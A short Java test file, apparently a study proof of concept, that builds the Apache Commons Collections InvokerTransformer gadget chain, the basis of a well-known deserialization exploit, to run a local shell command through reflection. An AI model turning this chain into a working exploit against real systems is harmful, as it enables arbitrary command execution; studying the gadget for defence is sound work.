package test;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class TestCommonsCols {
	
	public static void main(String[] args) throws IOException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchMethodException, SecurityException {
		
//		Runtime.getRuntime().exec("open .");
		
//		Method method = Runtime.class.getMethod("getRuntime", new Class[0]);
//		Runtime invoke = (Runtime) method.invoke(null, new Object[0]);
//		invoke.exec("open .");
		
		Transformer[] transformers = new Transformer[] { 
			   new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                
                //本地代码执行
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "open ." }) };

        Transformer transformedChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        innerMap.put("value", "value");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);

        Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next();
        onlyElement.setValue("foobar");	
	}
	

}
